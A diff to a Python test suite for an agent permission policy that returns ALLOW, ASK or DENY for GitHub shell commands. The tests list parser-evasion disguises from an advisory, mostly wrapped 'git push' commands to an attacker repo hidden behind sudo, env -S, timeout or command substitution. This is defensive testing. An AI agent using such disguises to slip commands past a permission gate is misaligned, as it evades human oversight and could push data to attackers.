@@ -26,7 +26,11 @@ from typing import Any
 
 import pytest
 
-from omnigent.policies.builtins._shell import SHELL_TOOLS
+from omnigent.policies.builtins._shell import (
+    SHELL_TOOLS,
+    UnsupportedShellSyntax,
+    split_command_segments,
+)
 from omnigent.policies.builtins.github import _DEFAULT_SHELL_TOOLS as _github_default_shell_tools
 from omnigent.policies.builtins.github import github_policy
 from omnigent.policies.builtins.orchestration import _SHELL_TOOLS as _orchestration_shell_tools
@@ -550,6 +554,70 @@ def test_shell_unparseable_git_command_asks() -> None:
     assert result is not None and result["result"] == "ASK"
 
 
+@pytest.mark.parametrize(
+    "command",
+    [
+        "echo ready # today's status\necho done",
+        "cat <<DATA\ntoday's status\nDATA\necho done",
+        "sh -c 'echo ready # status'",
+        "echo \\\nready",
+        "echo $(echo ready)",
+        'echo "$(echo ready)"',
+        "echo `echo ready`",
+        'echo "`echo ready`"',
+        "echo $'text'",
+        'echo $"text"',
+    ],
+)
+def test_unsupported_shell_syntax_asks_even_for_benign_commands(command: str) -> None:
+    assert _action(github_policy()(_sh(command))) == "ASK"
+
+
+@pytest.mark.parametrize("read_all,expected", [(False, "DENY"), (True, "ASK")])
+@pytest.mark.parametrize("command", ["parser-input", "sh -c 'parser-input'"])
+def test_completed_segments_keep_stricter_decisions(
+    monkeypatch: pytest.MonkeyPatch, read_all: bool, expected: str, command: str
+) -> None:
+    # Supply a partial parser result to isolate policy precedence from lexical syntax.
+    def partial_segments(value: str) -> list[str]:
+        if value == "parser-input":
+            raise UnsupportedShellSyntax(
+                "Unsupported syntax requires approval", ["gh repo view --repo octo/hello"]
+            )
+        return split_command_segments(value)
+
+    monkeypatch.setattr(
+        "omnigent.policies.builtins.github.split_command_segments", partial_segments
+    )
+    assert _action(github_policy(read_all=read_all)(_sh(command))) == expected
+
+
+@pytest.mark.parametrize("read_all,expected", [(False, "DENY"), (True, "ASK")])
+@pytest.mark.parametrize(
+    "command",
+    [
+        "echo ready # status\n{read}",
+        "{read} # status\necho done",
+        "echo $(echo ready) && {read}",
+        '{read}; echo "$(echo ready)"',
+        "echo $'ready'; {read}",
+        "echo \\\nready; {read}",
+        "cat <<DATA\nplain text\nDATA\n{read}",
+        "sh -c 'echo $(echo ready); {read}'",
+    ],
+)
+def test_completed_segments_are_classified_across_unsupported_regions(
+    read_all: bool, expected: str, command: str
+) -> None:
+    command = command.format(read="gh repo view --repo octo/hello")
+    assert _action(github_policy(read_all=read_all)(_sh(command))) == expected
+
+
+@pytest.mark.parametrize("command", ["echo '$(text)'", "echo '`text`'", r'echo "\$(text)"'])
+def test_literal_substitution_text_abstains(command: str) -> None:
+    assert github_policy()(_sh(command)) is None
+
+
 def test_shell_tools_param_overrides_default_tool() -> None:
     """A custom shell tool name is parsed when listed in ``shell_tools``.
 
@@ -617,74 +685,74 @@ def test_env_split_string_preserves_trailing_arguments(command: str, expected: s
 
 
 @pytest.mark.parametrize(
-    "command",
+    ("command", "expected"),
     [
         # Combined interpreter flags — ``-lc`` (login) / ``-ic`` (interactive) /
         # ``-xc`` (trace) still read the command from the next operand, like ``-c``.
-        f'bash -lc "git push {_EVIL} main"',
-        f"bash -ic 'git push {_EVIL} main'",
-        f"sh -xc 'git push {_EVIL} main'",
+        (f'bash -lc "git push {_EVIL} main"', "DENY"),
+        (f"bash -ic 'git push {_EVIL} main'", "DENY"),
+        (f"sh -xc 'git push {_EVIL} main'", "DENY"),
         # ``timeout`` consumes its own flags AND a leading duration positional
         # before the real command.
-        f"timeout 60 git push {_EVIL} main",
-        f"timeout --signal=KILL 5m git push {_EVIL} main",
-        f"timeout -s KILL 5m git push {_EVIL} main",
+        (f"timeout 60 git push {_EVIL} main", "DENY"),
+        (f"timeout --signal=KILL 5m git push {_EVIL} main", "DENY"),
+        (f"timeout -s KILL 5m git push {_EVIL} main", "DENY"),
         # ``nice`` / ``setsid`` / ``stdbuf`` carry their own option flags
         # (combined ``-oL`` and separate-value ``-o L`` forms both).
-        f"nice -n 10 git push {_EVIL} main",
-        f"nice -10 git push {_EVIL} main",
-        f"setsid -w git push {_EVIL} main",
-        f"stdbuf -oL git push {_EVIL} main",
-        f"stdbuf -o L git push {_EVIL} main",
+        (f"nice -n 10 git push {_EVIL} main", "DENY"),
+        (f"nice -10 git push {_EVIL} main", "DENY"),
+        (f"setsid -w git push {_EVIL} main", "DENY"),
+        (f"stdbuf -oL git push {_EVIL} main", "DENY"),
+        (f"stdbuf -o L git push {_EVIL} main", "DENY"),
         # ``sudo`` / ``env`` / ``command`` / ``time`` / ``exec`` carry their own
         # option flags too; skipping only the wrapper word left the flag as the
         # apparent command and let the push through.
-        f"sudo -u root git push {_EVIL} main",
-        f"sudo -n git push {_EVIL} main",
-        f"sudo -- git push {_EVIL} main",
-        f"sudo -u root -- git push {_EVIL} main",
-        f"env -i git push {_EVIL} main",
-        f"env -u GIT_DIR git push {_EVIL} main",
-        f"env --unset=GIT_DIR git push {_EVIL} main",
-        f"env -C /repo git push {_EVIL} main",
-        f"command -p git push {_EVIL} main",
-        f"time -p git push {_EVIL} main",
-        f"time -o /tmp/timing git push {_EVIL} main",
-        f"exec -a disguise git push {_EVIL} main",
+        (f"sudo -u root git push {_EVIL} main", "DENY"),
+        (f"sudo -n git push {_EVIL} main", "DENY"),
+        (f"sudo -- git push {_EVIL} main", "DENY"),
+        (f"sudo -u root -- git push {_EVIL} main", "DENY"),
+        (f"env -i git push {_EVIL} main", "DENY"),
+        (f"env -u GIT_DIR git push {_EVIL} main", "DENY"),
+        (f"env --unset=GIT_DIR git push {_EVIL} main", "DENY"),
+        (f"env -C /repo git push {_EVIL} main", "DENY"),
+        (f"command -p git push {_EVIL} main", "DENY"),
+        (f"time -p git push {_EVIL} main", "DENY"),
+        (f"time -o /tmp/timing git push {_EVIL} main", "DENY"),
+        (f"exec -a disguise git push {_EVIL} main", "DENY"),
         # Short options bundle: a value-taking option is only a separate token
         # when it ends the bundle, so ``-nu root`` consumes ``root`` but
         # ``-n10`` / ``-oL`` carry their value attached.
-        f"sudo -nu root git push {_EVIL} main",
-        f"sudo -knu root git push {_EVIL} main",
+        (f"sudo -nu root git push {_EVIL} main", "DENY"),
+        (f"sudo -knu root git push {_EVIL} main", "DENY"),
         # BSD sudo: -a/--auth-type and -c/--login-class take a value; omitting
         # them caused their value to be seen as the command head → silent ALLOW.
-        f"sudo -a foo git push {_EVIL} main",
-        f"sudo --auth-type foo git push {_EVIL} main",
-        f"sudo -c bar git push {_EVIL} main",
-        f"sudo --login-class bar git push {_EVIL} main",
-        f"env -iu FOO git push {_EVIL} main",
-        f"nice -n10 git push {_EVIL} main",
+        (f"sudo -a foo git push {_EVIL} main", "DENY"),
+        (f"sudo --auth-type foo git push {_EVIL} main", "DENY"),
+        (f"sudo -c bar git push {_EVIL} main", "DENY"),
+        (f"sudo --login-class bar git push {_EVIL} main", "DENY"),
+        (f"env -iu FOO git push {_EVIL} main", "DENY"),
+        (f"nice -n10 git push {_EVIL} main", "DENY"),
         # ``env -S`` splits its string and RUNS it, so the push lives INSIDE the
         # flag's value: consuming it as an ordinary value left zero tokens, and a
         # segment with no tokens abstains — a silent ALLOW the leading-``-``
         # backstop cannot see either.
-        f"env -S 'git push {_EVIL} main'",
-        f"env --split-string='git push {_EVIL} main'",
-        f"env --split-string 'git push {_EVIL} main'",
-        f"env -iS 'git push {_EVIL} main'",
-        f"env -u FOO -S 'git push {_EVIL} main'",
-        f"sudo -u root env -S 'git push {_EVIL} main'",
+        (f"env -S 'git push {_EVIL} main'", "DENY"),
+        (f"env --split-string='git push {_EVIL} main'", "DENY"),
+        (f"env --split-string 'git push {_EVIL} main'", "DENY"),
+        (f"env -iS 'git push {_EVIL} main'", "DENY"),
+        (f"env -u FOO -S 'git push {_EVIL} main'", "DENY"),
+        (f"sudo -u root env -S 'git push {_EVIL} main'", "DENY"),
         # An absolute path is the same wrapper: matching only the bare word left
         # the path token as the apparent command and abstained.
-        f"/usr/bin/sudo -u root git push {_EVIL} main",
-        f"/usr/bin/env -S 'git push {_EVIL} main'",
+        (f"/usr/bin/sudo -u root git push {_EVIL} main", "DENY"),
+        (f"/usr/bin/env -S 'git push {_EVIL} main'", "DENY"),
         # Command substitution executes the push; the ``x=`` outer token must
         # not be dismissed as a harmless env-assignment.
-        f"x=$(git push {_EVIL} main)",
-        f"echo `git push {_EVIL} main`",
+        (f"x=$(git push {_EVIL} main)", "ASK"),
+        (f"echo `git push {_EVIL} main`", "ASK"),
     ],
 )
-def test_shell_parser_evasion_disguises_are_gated(command: str) -> None:
+def test_shell_parser_evasion_disguises_are_gated(command: str, expected: str) -> None:
     """Parser-evasion disguises do not slip a push past the gate (GHSA-7mqg-cx4g-x2rf).
 
     Each command runs ``git push`` to a non-allowlisted attacker repo behind a
@@ -692,47 +760,47 @@ def test_shell_parser_evasion_disguises_are_gated(command: str) -> None:
     a wrapper that carries its own option flags (``timeout`` / ``nice`` /
     ``setsid`` / ``stdbuf`` / ``sudo`` / ``env`` / ``command`` / ``time`` /
     ``exec``, bundled short options included), or a command substitution —
-    which made the evaluator abstain and ALLOW. All must now resolve to the
-    inner push and DENY it.
+    which made the evaluator abstain and ALLOW. Resolved writes are denied;
+    opaque command substitutions require approval.
     """
     policy = github_policy(write_repos=[_REPO], write_branches=["main"])
-    assert _action(policy(_sh(command))) == "DENY"
+    assert _action(policy(_sh(command))) == expected
 
 
 @pytest.mark.parametrize(
-    "command",
+    ("command", "expected"),
     [
         # A wrapper in front of a benign command stays un-gated (no over-block).
-        "timeout 60 npm test",
-        "nice -n 10 ls -la",
-        "stdbuf -oL cat file.txt",
-        "sudo -u root npm test",
-        "sudo -nu root npm test",
-        "env -i make build",
-        "env -iu FOO make build",
-        "command -p ls",
-        "time -p pytest",
-        # A substitution whose body is not a gated git/gh op stays un-gated.
-        "x=$(date +%s)",
-        'echo "`uname -a`"',
+        ("timeout 60 npm test", "ALLOW"),
+        ("nice -n 10 ls -la", "ALLOW"),
+        ("stdbuf -oL cat file.txt", "ALLOW"),
+        ("sudo -u root npm test", "ALLOW"),
+        ("sudo -nu root npm test", "ALLOW"),
+        ("env -i make build", "ALLOW"),
+        ("env -iu FOO make build", "ALLOW"),
+        ("command -p ls", "ALLOW"),
+        ("time -p pytest", "ALLOW"),
+        # Substitution output is opaque even when its visible body is benign.
+        ("x=$(date +%s)", "ASK"),
+        ('echo "`uname -a`"', "ASK"),
         # A wrapped push to the ALLOWED repo+branch still passes.
-        f"timeout 60 git push https://github.com/{_REPO} main",
-        f"sudo -u root git push https://github.com/{_REPO} main",
-        f"sudo -nu root git push https://github.com/{_REPO} main",
-        f"env -iu FOO git push https://github.com/{_REPO} main",
-        "env -S 'npm test'",
-        f"env -S 'git push https://github.com/{_REPO} main'",
+        (f"timeout 60 git push https://github.com/{_REPO} main", "ALLOW"),
+        (f"sudo -u root git push https://github.com/{_REPO} main", "ALLOW"),
+        (f"sudo -nu root git push https://github.com/{_REPO} main", "ALLOW"),
+        (f"env -iu FOO git push https://github.com/{_REPO} main", "ALLOW"),
+        ("env -S 'npm test'", "ALLOW"),
+        (f"env -S 'git push https://github.com/{_REPO} main'", "ALLOW"),
     ],
 )
-def test_shell_parser_broadening_does_not_overblock(command: str) -> None:
+def test_shell_parser_broadening_does_not_overblock(command: str, expected: str) -> None:
     """The broadened parser does not gate wrappers around benign commands.
 
     Composability matters: the policy must keep abstaining on non-git/gh work
-    (``timeout npm test``) and on substitutions with no gated op, and still
-    ALLOW a wrapped push to an allowlisted repo.
+    (``timeout npm test``) and ALLOW a wrapped push to an allowlisted repo.
+    Unclassified command substitutions require approval.
     """
     policy = github_policy(write_repos=[_REPO], write_branches=["main"])
-    assert _action(policy(_sh(command))) == "ALLOW"
+    assert _action(policy(_sh(command))) == expected
 
 
 def test_unresolvable_wrapper_head_asks_instead_of_abstaining() -> None:
